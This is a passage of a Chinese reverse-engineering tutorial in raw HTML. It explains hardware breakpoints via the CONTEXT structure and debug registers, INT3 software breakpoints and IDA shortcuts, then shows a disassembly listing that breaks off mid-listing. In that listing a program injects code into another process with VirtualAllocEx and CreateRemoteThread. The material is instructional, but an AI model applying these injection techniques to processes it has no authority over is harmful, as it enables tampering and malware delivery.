class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">实现硬件断点，首先要获取当前线程环境</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取线程环境</span></span><br><span class=\"line\">CONTEXT g_Context = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">g_Context.ContextFlags = CONTEXT_CONTROL;</span><br><span class=\"line\"><span class=\"built_in\">GetThreadContext</span>(hThread, &amp;g_Context);</span><br><span class=\"line\">在CONTEXT结构体中，存放了诸多当前线程环境的信息，以下是从winnt.h文件中找到的CONTEXT结构体</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_CONTEXT</span> &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// The flags values within this flag control the contents of</span></span><br><span class=\"line\">    <span class=\"comment\">// a CONTEXT record.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// If the context record is used as an input parameter, then</span></span><br><span class=\"line\">    <span class=\"comment\">// for each portion of the context record controlled by a flag</span></span><br><span class=\"line\">    <span class=\"comment\">// whose value is set, it is assumed that that portion of the</span></span><br><span class=\"line\">    <span class=\"comment\">// context record contains valid context. If the context record</span></span><br><span class=\"line\">    <span class=\"comment\">// is being used to modify a threads context, then only that</span></span><br><span class=\"line\">    <span class=\"comment\">// portion of the threads context will be modified.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// If the context record is used as an IN OUT parameter to capture</span></span><br><span class=\"line\">    <span class=\"comment\">// the context of a thread, then only those portions of the thread&#x27;s</span></span><br><span class=\"line\">    <span class=\"comment\">// context corresponding to set flags will be returned.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// The context record is never used as an OUT only parameter.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD ContextFlags;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is</span></span><br><span class=\"line\">    <span class=\"comment\">// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT</span></span><br><span class=\"line\">    <span class=\"comment\">// included in CONTEXT_FULL.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD   Dr0;</span><br><span class=\"line\">    DWORD   Dr1;</span><br><span class=\"line\">    DWORD   Dr2;</span><br><span class=\"line\">    DWORD   Dr3;</span><br><span class=\"line\">    DWORD   Dr6;</span><br><span class=\"line\">    DWORD   Dr7;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    FLOATING_SAVE_AREA FloatSave;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_SEGMENTS.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD   SegGs;</span><br><span class=\"line\">    DWORD   SegFs;</span><br><span class=\"line\">    DWORD   SegEs;</span><br><span class=\"line\">    DWORD   SegDs;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_INTEGER.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD   Edi;</span><br><span class=\"line\">    DWORD   Esi;</span><br><span class=\"line\">    DWORD   Ebx;</span><br><span class=\"line\">    DWORD   Edx;</span><br><span class=\"line\">    DWORD   Ecx;</span><br><span class=\"line\">    DWORD   Eax;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_CONTROL.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD   Ebp;</span><br><span class=\"line\">    DWORD   Eip;</span><br><span class=\"line\">    DWORD   SegCs;              <span class=\"comment\">// MUST BE SANITIZED</span></span><br><span class=\"line\">    DWORD   EFlags;             <span class=\"comment\">// MUST BE SANITIZED</span></span><br><span class=\"line\">    DWORD   Esp;</span><br><span class=\"line\">    DWORD   SegSs;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the ContextFlags word</span></span><br><span class=\"line\">    <span class=\"comment\">// contains the flag CONTEXT_EXTENDED_REGISTERS.</span></span><br><span class=\"line\">    <span class=\"comment\">// The format and contexts are processor specific</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125; CONTEXT;</span><br><span class=\"line\">从CONTEXT结构体中我们可以看到存放了调试寄存器 Dr0-Dr3和Dr6、Dr7，通过设置这些寄存器我们可以实现硬件断点。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//传入下断点的地址、类型、长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">SetHardBP</span><span class=\"params\">(DWORD addr, BreakPointHard type, BreakPointLen len)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//利用上文中的DR7寄存器位段信息</span></span><br><span class=\"line\">    DBG_REG7 *pDr7 = (DBG_REG7 *)&amp;g_Context.Dr7;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//两字节的对齐粒度</span></span><br><span class=\"line\">        addr = addr - addr % <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (len == <span class=\"number\">3</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//四字节的对齐粒度</span></span><br><span class=\"line\">        addr = addr - addr % <span class=\"number\">4</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pDr7-&gt;L0 == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        g_Context.Dr0 = addr;   <span class=\"comment\">//利用Dr0寄存器存放地址</span></span><br><span class=\"line\">        pDr7-&gt;RW0 = type;       <span class=\"comment\">//Dr7寄存器中的RW0设置类型</span></span><br><span class=\"line\">        pDr7-&gt;LEN0 = len;        <span class=\"comment\">//Dr7寄存器中的LEN0设置长度</span></span><br><span class=\"line\">        pDr7-&gt;L0 = <span class=\"number\">1</span>;            <span class=\"comment\">//Dr7寄存器中的L0启用断点</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pDr7-&gt;L1 == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        g_Context.Dr1 = addr;</span><br><span class=\"line\">        pDr7-&gt;RW1 = type;</span><br><span class=\"line\">        pDr7-&gt;LEN1 = len;</span><br><span class=\"line\">        pDr7-&gt;L1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pDr7-&gt;L2 == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        g_Context.Dr2 = addr;</span><br><span class=\"line\">        pDr7-&gt;RW2 = type;</span><br><span class=\"line\">        pDr7-&gt;LEN2 = len;</span><br><span class=\"line\">        pDr7-&gt;L2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pDr7-&gt;L3 == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        g_Context.Dr3 = addr;</span><br><span class=\"line\">        pDr7-&gt;RW3 = type;</span><br><span class=\"line\">        pDr7-&gt;LEN3 = len;</span><br><span class=\"line\">        pDr7-&gt;L3 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">SetThreadContext</span>(hThread, &amp;g_Context);</span><br></pre></td></tr></table></figure>\n<h3 id=\"软件断点\"><a class=\"markdownIt-Anchor\" href=\"#软件断点\">#</a> 软件断点</h3>\n<p>int 3<br>\n 设置断点命令对应的汇编指令为 INT3，对应的机器指令的也就是 0xCC。CPU 运行代码的过程中若遇到汇编指令 INT3，则会触发 EXCEPTION_BREAKPOINT 异常。</p>\n<p>由于 Ollydbg 中按 F2 设置的断点是用户用来调试的临时断点（User Temporary Break Point），所以不需要在调试画面中显示。在代码与内存中显示出来的话，大大降低了代码的可读性，给代码调试带来不便。换言之，实际进程内存中 0x1003E21 的 “6A” 已经换成 “CC”，但为了调试方便，所以呢，OD 就没有显示出来。我们只需要把这个程序 dump 出来，然后放进 Hex_Editor 查看一下这个位置的数据即可。</p>\n<p><strong>它会先把下断点的位置的前一句代码改成 int 3 然后 等到运行到这里时，再把它改回来</strong></p>\n<p><strong>这个问题解释是这样的：先，调试器把断点处的第一个字节改成 0XCC，当接收到继续运行的消息时，调试器会先把这个 int 3 断点修复成原来的字节，然后会执行 eip-1 这个操作，把 int 3 改掉的代码继续执行，有 eip-1 的话，那么就很正常了</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210124121942299.png\" alt=\"å¨è¿éæå¥å¾çæè¿°\"></p>\n<p>调试 DR0-DR3 寄存器原理</p>\n<p>调试寄存器 DR0-DR3<br>\n 这四个寄存器是用来设置 断点地址的。断点的比对在物理地址转换前（异常产生时，还没有将线性地址转换成物理地址）。由于只有 0-3 四个保存地址的寄存器，所以，硬件断点，在物理上最多只能有 4 个。<br>\n调试寄存器 DR4-DR5<br>\n 这两个调试寄存器有 CR4 的 DE 标记控制。如果 DE 置位，那么对这两个寄存器的访问会导致 #UD 异常。如果 DE 置 0，那么他们就被化名为 DR6-DR7（你一定会问原来的 DR6-DR7 怎么办？这个…… 我也不知道。如果你搞明白了，一定记得告诉我）<br>\n调试寄存器 DR7 (控制寄存器)<br>\n(先介绍 DR7 对 DR6 的理解有好处。)</p>\n<p>DR7 是调试控制寄存器。控制方式嘛！：<br>\n\\1. L0-L3（由第 0，2，4，6 位控制）: 对应 DR0-DR3，设置断点作用范围，如果被置位，那么将只对当前任务有效。每次异常后，Lx 都被清零。<br>\n\\2. G0-G3（由第 1，3，5，7 位控制）：对应 DR0-DR3, 如果置位，那么所有的任务都有效。每次异常后不会被清零。以确保对所有任务有效。但是，不知道为什么，我在测试时：<br>\n设置 Gn 后，不能返回调试异常给调试器（如果你知道为什么，记得告诉我）<br>\n\\3. LE,GE（由第 8，9 位控制）: 这个在 P6 以下系列 CPU 上不被支持，在升级版的系列里面：如果被置位，那么 cpu 将会追踪精确的数据断点。LE 是局部的，GE 是全局的。（到底什么算精确的，我也不清楚，但是，我知道如果设置了这两个，cpu 的速度会降低。我在测试中，都没有置位。）<br>\n\\4. GD (由第 13 位控制): 如果置位，追踪下一条指令是否会访问调试寄存器。如果是，产生异常。在下面的 DR6 里面，你会知道他还和另外一个标志位有点关系。<br>\n\\5. R/W0-R/W3：（由第 16，17，20，21，24，25，28，29 位控制）：这个东西的处理有两种情况。</p>\n<h2 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h2>\n<h3 id=\"目录结构\"><a class=\"markdownIt-Anchor\" href=\"#目录结构\">#</a> 目录结构</h3>\n<p>在 IDA 的安装根目录下有许多文件夹，各个文件夹存储不同的内容</p>\n<p>cfg：包含各种配置文件，基本 IDA 配置文件 ida.cfg,GUI 配置文件 idagui.cfg，文本模式用户界面配置文件 idatui.cfg,</p>\n<p>idc：包含 IDA 内置脚本语言 IDC 所需要的核心文件</p>\n<p>ids：包含一些符号文件</p>\n<p>loaders：包含用于识别和解析 PE 或者 ELF</p>\n<p>plugins：附加的插件模块</p>\n<p>procs：包含处理器模块</p>\n<h3 id=\"快捷键\"><a class=\"markdownIt-Anchor\" href=\"#快捷键\">#</a> 快捷键</h3>\n<p>IDA 中的快捷键都是和菜单栏的各个功能选项一一对应的，基本上你只要能在菜单栏上找到某个功能，也就能看到相应的快捷键，这里记录几个常用的：</p>\n<p>a：将数据转换为字符串</p>\n<p>f5：一键反汇编</p>\n<p>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下 esc，会关闭该窗口）</p>\n<p>shift+f12：可以打开 string 窗口，一键找出所有的字符串，右击 setup，还能对窗口的属性进行设置</p>\n<p>ctrl+w：保存 ida 数据库</p>\n<p>ctrl+s：选择某个数据段，直接进行跳转</p>\n<p>ctrl + 鼠标滚轮：能够调节流程视图的大小</p>\n<p>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用</p>\n<p>g：直接跳转到某个地址</p>\n<p>n：更改变量的名称</p>\n<p>y：更改变量的类型</p>\n<p>/ ：在反编译后伪代码的界面中写下注释</p>\n<p>\\：在反编译后伪代码的界面中隐藏 / 显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p>\n<p>；：在反汇编后的界面中写下注释</p>\n<p>ctrl+shift+w：拍摄 IDA 快照</p>\n<p>u：undefine，取消定义函数、代码、数据的定义</p>\n<p>调试：根据需要调试的类型，选择对应的调试器，F9 使程序运行</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923132703693.png\" alt=\"image-20230923132703693\"></p>\n<p>g OpenProcess</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923133223561.png\" alt=\"image-20230923133223561\"></p>\n<p>查看交叉引用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923204924077.png\" alt=\"image-20230923204924077\"></p>\n<p>F2 下断</p>\n<h3 id=\"伪代码\"><a class=\"markdownIt-Anchor\" href=\"#伪代码\">#</a> 伪代码</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0040755</span>A  |&gt; \\<span class=\"number\">8B</span>86 FC030000 mov     eax,dword ptr ds:[esi+<span class=\"number\">0x3FC</span>]</span><br><span class=\"line\"><span class=\"number\">00407560</span>  |.  <span class=\"number\">3B</span>C3          cmp     eax,ebx</span><br><span class=\"line\"><span class=\"number\">00407562</span>  |.  <span class=\"number\">74</span> <span class=\"number\">0</span>D         je      <span class=\"type\">short</span> <span class=\"number\">00407571</span></span><br><span class=\"line\"><span class=\"number\">00407564</span>  |.  <span class=\"number\">50</span>            push    eax                              ; /hObject</span><br><span class=\"line\"><span class=\"number\">00407565</span>  |.  FF15 <span class=\"number\">74204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.CloseHa&gt;; \\CloseHandle</span><br><span class=\"line\"><span class=\"number\">0040756B</span>  |.  <span class=\"number\">899</span>E FC030000 mov     dword ptr ds:[esi+<span class=\"number\">0x3FC</span>],ebx</span><br><span class=\"line\"><span class=\"number\">00407571</span>  |&gt;  <span class=\"number\">8B</span>8E F8030000 mov     ecx,dword ptr ds:[esi+<span class=\"number\">0x3F8</span>]</span><br><span class=\"line\"><span class=\"number\">00407577</span>  |.  <span class=\"number\">6</span>A <span class=\"number\">40</span>         push    <span class=\"number\">0x40</span>                             ; /flProtect = <span class=\"number\">40</span> (<span class=\"number\">64.</span>)</span><br><span class=\"line\"><span class=\"number\">00407579</span>  |.  <span class=\"number\">68</span> <span class=\"number\">00100000</span>   push    <span class=\"number\">0x1000</span>                           ; |flAllocationType = <span class=\"number\">1000</span> (<span class=\"number\">4096.</span>)</span><br><span class=\"line\"><span class=\"number\">0040757</span>E  |.  <span class=\"number\">57</span>            push    edi                              ; |dwSize</span><br><span class=\"line\"><span class=\"number\">0040757F</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; |lpAddress</span><br><span class=\"line\"><span class=\"number\">00407580</span>  |.  <span class=\"number\">51</span>            push    ecx                              ; |hProcess</span><br><span class=\"line\"><span class=\"number\">00407581</span>  |.  <span class=\"number\">895</span>D FC       mov     [local<span class=\"number\">.1</span>],ebx                    ; |</span><br><span class=\"line\"><span class=\"number\">00407584</span>  |.  FF15 <span class=\"number\">84204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.Virtual&gt;; \\VirtualAllocEx</span><br><span class=\"line\"><span class=\"number\">0040758</span>A  |.  <span class=\"number\">3B</span>C3          cmp     eax,ebx</span><br><span class=\"line\"><span class=\"number\">0040758</span>C  |.  <span class=\"number\">8986</span> EC030000 mov     dword ptr ds:[esi+<span class=\"number\">0x3EC</span>],eax</span><br><span class=\"line\"><span class=\"number\">00407592</span>  |.  <span class=\"number\">75</span> <span class=\"number\">09</span>         jnz     <span class=\"type\">short</span> <span class=\"number\">0040759</span>D</span><br><span class=\"line\"><span class=\"number\">00407594</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00407595</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00407596</span>  |.  <span class=\"number\">68</span> E4AA4100   push    <span class=\"number\">0041</span>AAE4                         ;  ASCII <span class=\"string\">&quot;在目标进程申请代码空间失败！&quot;</span></span><br><span class=\"line\"><span class=\"number\">0040759B</span>  |.^ EB A7         jmp     <span class=\"type\">short</span> <span class=\"number\">00407544</span></span><br><span class=\"line\"><span class=\"number\">0040759</span>D  |&gt;  <span class=\"number\">8B</span>CE          mov     ecx,esi</span><br><span class=\"line\"><span class=\"number\">0040759F</span>  |.  E8 <span class=\"number\">4</span>CFDFFFF   call    <span class=\"number\">004072F</span>0</span><br><span class=\"line\"><span class=\"number\">004075</span>A4  |.  <span class=\"number\">3</span>AC3          cmp     al,bl</span><br><span class=\"line\"><span class=\"number\">004075</span>A6  |.  <span class=\"number\">75</span> <span class=\"number\">2</span>C         jnz     <span class=\"type\">short</span> <span class=\"number\">004075</span>D4</span><br><span class=\"line\"><span class=\"number\">004075</span>A8  |.  <span class=\"number\">8B</span>96 EC030000 mov     edx,dword ptr ds:[esi+<span class=\"number\">0x3EC</span>]</span><br><span class=\"line\"><span class=\"number\">004075</span>AE  |.  <span class=\"number\">8B</span>86 F8030000 mov     eax,dword ptr ds:[esi+<span class=\"number\">0x3F8</span>]</span><br><span class=\"line\"><span class=\"number\">004075B</span>4  |.  <span class=\"number\">68</span> <span class=\"number\">00800000</span>   push    <span class=\"number\">0x8000</span>                           ; /dwFreeType = <span class=\"number\">8000</span> (<span class=\"number\">32768.</span>)</span><br><span class=\"line\"><span class=\"number\">004075B</span>9  |.  <span class=\"number\">53</span>            push    ebx                              ; |dwSize</span><br><span class=\"line\"><span class=\"number\">004075B</span>A  |.  <span class=\"number\">52</span>            push    edx                              ; |lpAddress</span><br><span class=\"line\"><span class=\"number\">004075B</span>B  |.  <span class=\"number\">50</span>            push    eax                              ; |hProcess</span><br><span class=\"line\"><span class=\"number\">004075B</span>C  |.  FF15 <span class=\"number\">80204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.Virtual&gt;; \\VirtualFreeEx</span><br><span class=\"line\"><span class=\"number\">004075</span>C2  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">004075</span>C3  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">004075</span>C4  |.  <span class=\"number\">899</span>E EC030000 mov     dword ptr ds:[esi+<span class=\"number\">0x3EC</span>],ebx</span><br><span class=\"line\"><span class=\"number\">004075</span>CA  |.  <span class=\"number\">68</span> C8AA4100   push    <span class=\"number\">0041</span>AAC8                         ;  ASCII <span class=\"string\">&quot;在目标进程写入代码失败！&quot;</span></span><br><span class=\"line\"><span class=\"number\">004075</span>CF  |.^ E9 <span class=\"number\">70F</span>FFFFF   jmp     <span class=\"number\">00407544</span></span><br><span class=\"line\"><span class=\"number\">004075</span>D4  |&gt;  <span class=\"number\">8B</span>8E EC030000 mov     ecx,dword ptr ds:[esi+<span class=\"number\">0x3EC</span>]</span><br><span class=\"line\"><span class=\"number\">004075</span>DA  |.  <span class=\"number\">8B</span>96 F8030000 mov     edx,dword ptr ds:[esi+<span class=\"number\">0x3F8</span>]</span><br><span class=\"line\"><span class=\"number\">004075E0</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; /lpThreadId</span><br><span class=\"line\"><span class=\"number\">004075E1</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; |dwCreationFlags</span><br><span class=\"line\"><span class=\"number\">004075E2</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; |lpParameter</span><br><span class=\"line\"><span class=\"number\">004075E3</span>  |.  <span class=\"number\">51</span>            push    ecx                              ; |lpStartAddress</span><br><span class=\"line\"><span class=\"number\">004075E4</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; |dwStackSize</span><br><span class=\"line\"><span class=\"number\">004075E5</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; |lpThreadAttributes</span><br><span class=\"line\"><span class=\"number\">004075E6</span>  |.  <span class=\"number\">52</span>            push    edx                              ; |hProcess</span><br><span class=\"line\"><span class=\"number\">004075E7</span>  |.  FF15 <span class=\"number\">50204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.CreateR&gt;; \\CreateRemoteThread</span><br><span class=\"line\"><span class=\"number\">004075</span>ED  |.  <span class=\"number\">3B</span>C3          cmp     eax,ebx</span><br><span class=\"line\"><span class=\"number\">004075</span>EF  |.  <span class=\"number\">8986</span> FC030000 mov     dword ptr ds:[esi+<span class=\"number\">0x3FC</span>],eax</span><br><span class=\"line\"><span class=\"number\">004075F</span>5  |.  <span class=\"number\">75</span> <span class=\"number\">2</span>C         jnz     <span class=\"type\">short</span> <span class=\"number\">00407623</span></span><br><span class=\"line\"><span class=\"number\">004075F</span>7  |.  <span class=\"number\">8B</span>86 EC030000 mov     eax,dword ptr ds:[esi+<span class=\"number\">0x3EC</span>]</span><br><span class=\"line\"><span class=\"number\">004075F</span>D  |.  <span class=\"number\">8B</span>8E F8030000 mov     ecx,dword ptr ds:[esi+<span class=\"number\">0x3F8</span>]</span><br><span class=\"line\"><span class=\"number\">00407603</span>  |.  <span class=\"number\">68</span> <span class=\"number\">00800000</span>   push    <span class=\"number\">0x8000</span>                           ; /dwFreeType = <span class=\"number\">8000</span> (<span class=\"number\">32768.</span>)</span><br><span class=\"line\"><span 